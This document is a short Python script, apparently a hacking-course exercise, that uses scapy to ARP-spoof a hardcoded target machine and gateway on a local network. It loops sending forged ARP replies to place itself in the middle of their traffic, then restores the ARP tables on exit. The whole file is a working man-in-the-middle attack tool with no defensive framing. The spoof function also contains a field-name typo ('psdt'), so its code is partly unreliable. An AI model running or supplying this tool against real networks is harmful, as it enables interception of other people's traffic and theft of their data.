import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast= broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 ,psdt=target_ip,hwdst =target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip,source_ip):
            destination_mac =get_mac(destination_ip)
            source_mac=get_mac(source_ip)
            packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
            scapy.send(packet,count=4,verbose=False)

target_ip = "192.168.1.101"
gateway_ip = "192.168.1.1"

try:
    sent_packets=0
    while True:
        spoof(target_ip ,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets = sent_packets+2
        print("\r[+]Packets Sent " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+]Crtl+C detected ...quitting\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)